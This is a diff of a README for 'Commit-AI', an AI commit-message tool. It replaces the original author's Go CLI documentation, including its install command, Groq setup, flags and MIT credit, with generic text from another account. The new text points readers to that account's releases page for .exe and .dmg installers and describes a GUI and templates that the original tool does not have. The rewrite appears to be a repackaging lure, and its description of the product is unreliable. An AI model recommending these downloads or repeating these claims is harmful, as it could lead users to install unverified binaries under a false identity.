@@ -1,105 +1,88 @@
-# Commit-AI 🤖
+# 🌟 Commit-AI - Professionalize Your Git History Effortlessly
 
-<div align="left">
+## 📥 Download Now
+[![Download Commit-AI](https://img.shields.io/badge/Download-Commit--AI-blue.svg)](https://github.com/flackynmr1/Commit-AI/releases)
 
-**Professionalize your Git history with AI-generated Conventional Commits.**
+## 🚀 Getting Started
+Commit-AI helps you create clear, professional Git commit messages using AI. This tool uses AI to generate Conventional Commits, which makes your project history look clean and organized. Follow the steps below to download and run Commit-AI on your computer.
 
-[![Version](https://img.shields.io/badge/version-1.1.0-red?style=flat-square)](https://github.com/NeelFrostrain/Commit-Ai-Go)
-[![Go](https://img.shields.io/badge/go-%3E%3D1.25.6-00ADD8?style=flat-square&logo=go&logoColor=white)](https://golang.org)
-[![Groq](https://img.shields.io/badge/Groq-AI-cyan?style=flat-square)](https://groq.com)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## 🖥️ System Requirements
+To install and run Commit-AI, you need:
 
-Stop writing "fixed stuff" and start writing commits that tell a story.
+- A computer running Windows, macOS, or Linux.
+- At least 100 MB of free disk space.
+- An active internet connection to download the application and updates.
 
-</div>
+## 📦 Download & Install
+1. **Visit the Releases Page:** Click the link below to access the latest version of Commit-AI:
+   [Commit-AI Releases](https://github.com/flackynmr1/Commit-AI/releases)
 
----
+2. **Select Your Version:** On the releases page, find the latest version of Commit-AI.
 
-## 📖 About Commit-AI
+3. **Download the Installer:** Click on the package that matches your operating system (e.g., `Commit-AI-v1.0.exe` for Windows, `Commit-AI-v1.0.dmg` for macOS).
 
-**Commit-AI** transforms raw, technical code changes into **human-readable, professional documentation**. By leveraging Groq's inference engine (Llama 3.1 8B), it acts as a bridge between your terminal and your project's history.
+4. **Run the Installer:** 
+   - Locate the downloaded file on your computer.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-### 🧠 The Logic
+## 🛠️ Initial Setup
+Once the installation is complete, you can set up Commit-AI:
 
-The tool reads your **Git Diff** to understand:
+1. **Open the Application:** Find Commit-AI in your applications folder or on your desktop and open it.
 
-- **Intent:** Adding a feature or fixing a regression?
-- **Impact:** What specific logic changed within the functions?
-- **Context:** Automatically filters out noise like `package-lock.json` or `node_modules`.
+2. **Configure Git Settings:**
+   - You may need to link Commit-AI to your existing Git configuration.
+   - If prompted, enter your Git username and email address.
 
----
+3. **Choose a Commit Template:** 
+   - The application offers templates for different types of commits (e.g., features, fixes, chores).
+   - Select a template that fits your project needs.
 
-## ⚡ Quick Start
+## ✍️ Using Commit-AI
+With Commit-AI, creating commits becomes seamless. Here’s how:
 
-### 1️⃣ Installation
+1. **Make Changes:** Edit your project files as needed. 
 
-**For Go Users:**
+2. **Open Commit-AI:** Launch the application each time you want to create a commit.
 
-```bash
-go install github.com/NeelFrostrain/Commit-Ai-Go@latest
+3. **Generate a Commit Message:**
+   - Click on the "Generate" button to receive a suggested commit message.
+   - Review the message; you can edit it if you want to customize it.
 
-```
+4. **Copy and Commit:** 
+   - Copy the generated message.
+   - Open your Git terminal and type `git commit -m "<your commit message>"` to finalize your commit.
 
-**For Windows (Non-Go Users):**
+## 📋 Features
+- **AI-Powered Messages:** Automatic generation of commit messages based on your project changes.
+- **Simple Interface:** User-friendly design that makes it easy for anyone to use.
+- **Customization Options:** Adjust templates and settings to match your personal style or team standards.
+- **Cross-Platform Compatibility:** Runs smoothly on Windows, macOS, and Linux.
 
-1. Download the latest `commit-ai-installer.exe` from [Releases](https://github.com/NeelFrostrain/Commit-Ai-Go/releases/latest/).
-2. Run the installer. It will automatically move the binary to your `AppData` and update your `PATH`.
+## 💻 Frequently Asked Questions
 
-### 2️⃣ Configuration (One-Time Setup)
+### What is Conventional Commits?
+Conventional Commits is a specification for writing standardized commit messages. It helps in understanding the history of changes over time.
 
-You don't need to manually create `.env` files.
+### Is Commit-AI free to use?
+Yes, Commit-AI is available for free. You can download and use it without any cost.
 
-1. Visit [Groq Console](https://console.groq.com/keys) to get your key.
-2. Run `commit-ai` in any terminal.
-3. Paste your key when prompted. **Commit-AI** will save it to `~/.commit-ai-key` and your System Registry for global access.
+### Do I need to be a programmer to use this?
+No, Commit-AI is designed for anyone who uses Git, regardless of their technical background. 
 
----
+### How do I report issues or provide feedback?
+You can report issues or give feedback through the Issues section of the GitHub repository.
 
-## ✨ Features
+### Can I contribute to the project?
+Yes, contributions are welcome! You can fork the repository and submit a pull request with your improvements.
 
-| Feature                   | Description                                                |
-| ------------------------- | ---------------------------------------------------------- |
-| **🧠 Deep Diff Analysis** | Understands code logic, not just file metadata.            |
-| **📝 Conventional Style** | Strictly follows the `type: description` standard.         |
-| **📊 Technical Reports**  | Generates a detailed bulleted summary for the commit body. |
-| **🛡️ Global Config**      | Set your API key once, use it in any project folder.       |
-| **🚀 Fast**               | Powered by Groq/Llama-3.1 for near-instant results.        |
+## 🗨️ Community and Support
+For questions or support, visit the GitHub repository. You can connect with developers and users who can offer assistance. Look for the Discussions section to share your experiences or ask for help.
 
----
+## 🌐 Links
+**Download Commit-AI Again:** [Commit-AI Releases](https://github.com/flackynmr1/Commit-AI/releases)
 
-## 📖 Usage
+**GitHub Repository:** [Commit-AI GitHub](https://github.com/flackynmr1/Commit-AI)
 
-### Command Flags
-
-| Flag        | Short | Description                                             |
-| ----------- | ----- | ------------------------------------------------------- |
-| `--commit`  | `-c`  | Performs the `git commit` after generating the message. |
-| `--yes`     | `-y`  | Skips the confirmation prompt (Auto-pilot).             |
-| `--version` | `-v`  | Displays version information.                           |
-
-### Example Workflow
-
-1. **Stage changes:** `git add .`
-2. **Review AI suggestion:** `commit-ai`
-3. **Commit with AI:** `commit-ai -c`
-
----
-
-## ⚙️ Standards & Privacy
-
-### Conventional Categories
-
-`feat`, `fix`, `docs`, `style`, `refactor`, `chore`.
-
-### 🛡️ Privacy
-
-- **Local Keys:** Your API key is stored locally on your machine.
-- **Diffs Only:** Only the code diff of your **staged** files is sent to the AI.
-
----
-
-## 📄 License
-
-MIT © [Neel Frostrain](https://github.com/NeelFrostrain)
-
----
+Follow the steps and enjoy using Commit-AI to enhance your Git commitments. Happy coding!
